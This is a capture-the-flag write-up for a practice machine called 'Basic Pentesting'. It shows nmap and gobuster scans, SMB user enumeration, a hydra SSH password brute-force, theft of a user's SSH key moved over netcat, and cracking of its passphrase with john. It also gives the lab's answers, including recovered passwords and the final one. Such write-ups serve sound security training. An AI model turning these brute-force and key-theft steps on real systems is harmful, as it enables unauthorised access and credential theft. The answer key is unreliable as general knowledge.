# Basic Pentesting

##  Find the services exposed by the machine
Do a netwrok scan using nmap

```
nmap -sC -sV -oN nmap/initial_scan $IP
```

Results:

```
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http-proxy?
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2020-09-07T18:03:22-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-07T22:03:22
|_  start_date: N/A

```


## 2 What is the name of the hidden directory on the web server(enter name without /)?
Looks like a great oportunity to run gobuster and crawl over the server

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $IP -o gobuster/dir_lookup 

results:
/development
```

## 4 - User brute-forcing to find the username & password

Enumerating smb 

```
nmap --script smb-enum-users $IP
(no results)
```

```
enum4linux -a $IP

ACCESSIBLE SHARED FOLDERS:
Anonymous
USERS FOUND:
jan
kay
```

## 5 - What is the username?

```
jan
```

## 6 - What is the password?

As suggested above, using brute force with wordlist from git (10 Million password list )

```
hydra -l jan -P rockyou.txt ssh://$IP

[22][ssh] host: 10.10.171.203   login: jan   password: armando
```

## 7 - What service do you use to access the server(answer in abbreviation in all caps)?
```
SSH
```

## 8- Enumerate the machine to find any vectors for privilege escalation 

Used linpeas (because it highlights the text) and transfered it over NC to the remote machine

```
found ssh keys in /home/kay/.ssh
```

Transfered it over nc to local machine

```
chmod 600 id_rsa
ssh -i id_rsa kay@$IP
(request passphrase)

python ssh2john id_rsa > ssh2john
john --wordlist=/usr/share/wordlists/rockyou.txt ssh2john
password: beeswax
```
## 9 - What is the name of the other user you found(all lower case)?
from the enum4linux result

```
kay
```

## 10 - What is the final password you obtain?

```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

